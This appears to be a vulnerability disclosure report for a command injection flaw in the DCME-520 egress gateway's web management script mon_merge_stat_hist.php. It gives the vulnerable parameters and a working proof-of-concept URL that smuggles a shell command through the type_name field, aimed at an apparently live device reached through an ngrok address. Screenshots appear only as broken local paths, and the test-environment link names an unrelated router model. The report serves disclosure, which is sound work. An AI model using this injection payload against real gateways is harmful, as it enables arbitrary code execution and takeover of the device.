## Affected version 

DCME-520

## Vulnerability details 

DCME-520 Multi-core egress gateway is a new generation of high-performance Internet egress gateway for multi-user, multi-traffic and multi-service types. The command execution vulnerability exists in the DCME-520 gateway web management background. Attackers can use this series of vulnerabilities to execute arbitrary code on the device and control the device.

The firmware download address: https://www.dcnetworks.com.cn/ruanjian.html?title=dcme
The test environment is a real dcme-520 devicehttps://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8300



一、mon_merge_stat_hist.php

Code audit
Code position in equipment system in/usr/local/WWW/function/audit/newstatistics/mon_merge_stat_hist. PHP
First, the user can control the following parameters, among which statset is used to control the conditional branch

![image-20250320232816219](/Users/fizzl/Library/Application Support/typora-user-images/image-20250320232816219.png)

2、There are injection points inside the getList function, and these parameters can be controlled by the user

![image-20250320232845393](/Users/fizzl/Library/Application Support/typora-user-images/image-20250320232845393.png)

3、payload:? statset=predef_bw_user&type=5mins&type_name=|echo 114514 > 1.txt|

verify
Log in to the web management background

![image-20250320232920424](/Users/fizzl/Library/Application Support/typora-user-images/image-20250320232920424.png)

Access the url of the vulnerability:
http://8363-218-19-14-194.ngrok-free.app/function/audit/newstatistics/mon_merge_stat_hist.php

![image-20250320232949766](/Users/fizzl/Library/Application Support/typora-user-images/image-20250320232949766.png)

Construction payload:
Create the txt file and write the numbers

```http
poc：
https://8363-218-19-14-194.ngrok-free.app/function/audit/newstatistics/mon_merge_stat_hist.php?statset=predef_bw_user&type=5mins&type_name=|echo%20114514%20%3E%201.txt|
```

Send poc execution

![image-20250320233044749](/Users/fizzl/Library/Application Support/typora-user-images/image-20250320233044749.png)

txt file is created and written successfully

![image-20250320233108312](/Users/fizzl/Library/Application Support/typora-user-images/image-20250320233108312.png)







